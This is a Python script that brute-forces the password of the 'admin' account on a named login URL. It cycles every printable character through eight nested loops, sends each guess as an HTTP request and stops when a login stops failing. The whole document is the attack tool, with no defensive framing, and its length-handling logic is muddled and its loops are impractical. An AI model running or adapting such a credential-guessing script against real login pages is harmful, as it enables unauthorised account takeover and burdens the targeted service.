import requests
import sys
import threading

url = "https://requestswebsite.notanothercoder.repl.co/confirm-login"

characters = '!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'

possible_password = ""
password_length = 0
username_name = "admin"
stop = False

def send_request(username, password):

	data = {
	"username":username,
	"password":password,
	}

	r = requests.get(url,data = data)
	print(r.text)
	return r.text

def main_function():
	global password_length
	global possible_password
	while stop == False and password_length < 9 and password_length >= 0:
		for a in characters:
			for b in characters:
				for c in characters:
					for d in characters:
						for e in characters:
							for f in characters:
								for g in characters:
									for h in characters:
										possible_password = possible_password + a
										possible_password = possible_password + b
										possible_password = possible_password + c
										possible_password = possible_password + d
										possible_password = possible_password + e
										possible_password = possible_password + f
										possible_password = possible_password + g
										possible_password = possible_password + h

										passwd = possible_password[:len(possible_password)-password_length]

										if 'failed to login' in send_request(username_name,passwd).lower():
											print(passwd)
										else:
											print("this is :",passwd)
											sys.exit(0)
										possible_password = ""

		password_length += 1

main_function()